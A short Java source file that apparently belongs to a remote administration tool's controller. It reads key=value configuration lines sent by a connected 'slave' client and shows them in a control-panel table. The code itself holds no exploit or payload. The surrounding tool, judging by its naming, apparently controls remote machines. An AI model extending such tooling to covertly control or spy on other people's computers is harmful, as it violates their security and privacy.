package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlConfig;

public class Packet66Config extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();
		
		String[] config = new String[len];
		
		for (int i = 0; i < len; i++) {
			config[i] = slave.readLine();
		}
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlConfig panel = (PanelControlConfig) frame.panels.get("config");
			
			for (String str : config) {
				try {
					String[] args = str.split("=");
					String k = args[0];
					String v = args[1];
					panel.getModel().addRow(new Object[] { k, v });
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}
	}

}
